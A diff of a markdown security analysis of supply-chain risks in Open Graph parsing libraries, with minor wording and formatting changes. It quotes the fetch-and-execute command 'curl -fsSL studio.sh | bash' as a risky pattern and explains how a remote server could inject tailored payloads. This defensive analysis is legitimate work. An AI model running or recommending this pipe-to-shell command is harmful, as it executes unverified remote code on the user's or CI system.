@@ -10,7 +10,7 @@ The Open Graph Protocol enables websites to act as rich objects in social and co
 - The Inherent Risk
 Since parsers must process external, untrusted HTML content, they constitute a critical interface. If the Node/PHP libraries used for processing are insufficiently isolated or contain manipulated installation routines, the parsing tool mutates into the primary entry point for supply chain attacks.
 
-The analysis of the ecosystem surrounding the components under qapdex-maker.github.io/opengraph-node/ shows a critical vulnerability in the deployment and installation phase:
+The analysis of the components under qapdex-maker.github.io/opengraph-node/ shows a critical vulnerability in the deployment and installation phase:
 
 ### 3. Structure of the Investigation Folder
 The test environment includes several validation pages:
@@ -26,9 +26,10 @@ curl -fsSL studio.sh | bash
 
 
 Security analysis of this pattern
-Unencrypted/Unverified Execution: The direct piping of a remote resource into the shell (bash) bypasses local security policies.
+- Unencrypted/Unverified Execution:
+The direct piping of a remote resource into the shell (bash) bypasses local security policies.
 
-Dynamic Payload Generation: The server behind studio.sh can inject malicious code based on the User-Agent or IP address of the requesting system (e.g., a CI/CD pipeline), which remains undetected during static code analysis.
+- Dynamic Payload Generation: The server behind studio.sh can inject malicious code based on the User-Agent or IP address of the requesting system (e.g., a CI/CD pipeline), which remains undetected during static code analysis.
 
 ### 4. Threat Modeling
 Based on the Meta-Bug Taxonomy and Invisible Attack Surface Mapping, the attack vector can be classified as follows:
